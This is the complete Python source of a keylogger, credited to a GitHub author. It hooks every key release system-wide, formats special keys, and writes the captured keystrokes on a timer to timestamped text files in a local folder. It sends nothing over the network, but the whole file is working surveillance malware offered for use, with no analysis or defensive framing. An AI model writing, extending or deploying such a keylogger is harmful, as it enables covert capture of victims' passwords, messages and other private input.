import keyboard # for keylogs
import json # for the time
from threading import Timer
from datetime import datetime

# report timing

with open("data.json", "r") as d:
    data = json.load(d)
    
SEND_REPORT_EVERY = data["time"] # in seconds, 60 means 1 minute, Default : 5 minutes

class Keylogger:
    def __init__(self, interval, report_method="file"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        self.log = ""

        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def formatSpecialKey(self, key):
        key = key.replace(" ", "_")
        key = f"[{key.upper()}]"
        return key

    def formatTime(self, time):
        relevantTime = str(time)[:-7]
        formattedTime = relevantTime.replace(" ", "-").replace(":", "")
        return formattedTime


    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occurred
        (i.e when a key is released in this example)
        """
        
        if len(key := event.name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            
            specialCases = {
                "space": " ",
                "enter": "[ENTER]\n",
                "decimal" : "."
            }

            key = specialCases.get(key, self.formatSpecialKey(key))

        # finally, add the key name to our global `self.log` variable
        self.log += key

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = self.formatTime(self.start_dt)
        end_dt_str = self.formatTime(self.end_dt)
        self.filename = f"{start_dt_str}-+-{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""

        # open the file in write mode (create it)
        with open(f"Files\\{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        print(f"[+] Saved Files\\{self.filename}.txt")
    
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """

        if self.log: # if there is something in log, report it
            
            self.end_dt = datetime.now()
            self.update_filename()

            if self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()

            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")


        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        
        timer.daemon = True # set the thread as daemon (dies when main thread die)
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback) # start the keylogger
        self.report()
        keyboard.wait() # block the current thread, wait until CTRL+C is pressed


# This Code is written by crypto-navdeep (www.github.com/crypto-navdeep)
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
